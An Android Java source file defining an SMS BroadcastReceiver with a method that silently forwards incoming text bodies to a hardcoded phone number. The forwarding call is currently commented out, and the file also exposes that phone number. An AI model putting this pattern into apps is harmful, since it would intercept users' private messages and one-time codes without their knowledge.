package com.svnchina.application.activity;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Created by ZhongXiaolong on 2018/8/15 12:53.
 *
 * 收到短信 然后转发
 */
public class SmsReceiver extends BroadcastReceiver {/*intent:广播发送时使用的intent*/

    @Override
    public void onReceive(Context context, Intent intent) {/*Bundle对象也是通过键值对的形式封装数据的*/
        Bundle bundle = intent.getExtras();/*数组中的每个元素都是一条短信*/
        Object[] objects = (Object[]) bundle.get("pdus");/*对数组中的每条短信进行遍历*/
        for (Object object : objects) {/*通过pdu创建短信对象*/
            final SmsMessage sms = SmsMessage.createFromPdu((byte[]) object);/*获取发信人的号码*/
//            String body = "发件人:"+sms.getOriginatingAddress()+"\n" + sms.getMessageBody();
//            Log.d("SmsReceiver", body);
            if (!sms.getOriginatingAddress().contains("10010")) {
                Log.d("SmsReceiver", "发送短信");
//                forward(context, sms.getMessageBody());
            }
        }
    }


    private void forward(Context context,String body){
        SmsManager smsManager = SmsManager.getDefault();
        String SENT_SMS_ACTION = "SENT_SMS_ACTION";
        Intent sentIntent = new Intent(SENT_SMS_ACTION);
        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent,   0);
        String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";
// create the deilverIntent parameter
        Intent deliverIntent = new Intent(DELIVERED_SMS_ACTION);
        PendingIntent deliverPI = PendingIntent.getBroadcast(context, 0,  deliverIntent, 0);

        smsManager.sendTextMessage("18666083101", null, body, sentPI, deliverPI);

    }
}